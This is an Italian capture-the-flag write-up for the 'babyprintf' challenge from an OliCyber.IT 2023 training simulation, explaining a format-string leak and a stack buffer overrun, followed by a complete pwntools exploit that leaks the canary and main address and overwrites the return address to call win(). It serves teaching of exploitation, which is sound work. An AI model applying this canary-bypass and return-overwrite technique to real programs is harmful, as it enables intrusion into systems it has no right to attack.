# OliCyber.IT 2023 - Simulazione training camp 2

## [binary] babyprintf (21 risoluzioni)

La challenge fa echo di ogni stringa inserita. Le vulnerabilità nel programma sono un buffer overrun, dato che il numero di byte letti è maggiore della dimensione del buffer (300 vs 32), e una printf con formattatore definito dall'utente.

Il programma contiene una win function che bisogna arrivare a chiamare.

### Soluzione

Usando la printf si possono leakare dallo stack il canary del programma e un indirizzo a main. Con un offset dall'indirizzo di main ottenuto si arriva all'indirizzo della funzione `win()`, che stampa la flag.

Una volta ottenuti i valori necessari basta sovrascrivere il canary e l'indirizzo di ritorno con il buffer overrun, e poi triggerare l'uscita da main scrivendo `!q`

### Exploit

```python
#!/bin/python3

import os
from pwn import *
import logging
logging.disable()

HOST = os.environ.get("HOST", "xxx.challs.olicyber.it")
PORT = int(os.environ.get("PORT", 34001))

io = remote(HOST, PORT)

mem = [b""] * 100

io.recvuntil(b"back:")
for i in range(100):
    io.sendline(f"%{i}$p")
    mem[i] = io.recvline()

cs = mem[12]
canary = eval(cs)

ms = mem[16]
main = eval(ms)
win = main - 54

log.success(f"canary: {hex(canary)}")
log.success(f"main: {hex(main)}")
log.success(f"win: {hex(win)}")

io.sendline(fit({
    32: p64(canary)*2 + p64(win) * 3
}))

io.sendline(b"!q")

f = io.recvline()
f += io.recvline(timeout=0.1)
f += io.recvline(timeout=0.1)

assert "flag" in f

print(f)

```
